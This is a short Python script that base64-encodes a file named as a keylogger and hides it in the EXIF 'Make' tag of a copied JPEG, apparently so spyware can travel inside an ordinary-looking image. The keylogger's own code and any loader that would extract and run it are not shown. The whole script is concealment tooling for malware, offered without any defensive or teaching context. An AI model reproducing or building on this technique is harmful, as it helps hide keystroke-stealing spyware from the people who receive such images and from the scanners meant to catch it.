import base64
import piexif
import shutil
import os

def encode_to_base64(file_path):
    with open(file_path, 'rb') as file:
        encoded_string = base64.b64encode(file.read())
    return encoded_string

#https://stackoverflow.com/questions/61160154/embed-a-data-inside-jpg-file-without-altering-the-image-in-python

def embed_into_image(image_path, encoded_keylogger, output_image):
    if not os.path.isfile(output_image):
        shutil.copy(image_path, output_image)
    
    exif_dict = piexif.load(image_path)
    exif_dict['0th'][piexif.ImageIFD.Make] = encoded_keylogger
    exif_bytes = piexif.dump(exif_dict)
    piexif.insert(exif_bytes, output_image)


keylogger_path = 'keylogger6841.py'

image_path = '/Users/zuranaftab/Downloads/unsw_0.jpg'

output_image = 'myimage.jpg'

encoded_keylogger = encode_to_base64(keylogger_path)

embed_into_image(image_path, encoded_keylogger, output_image)

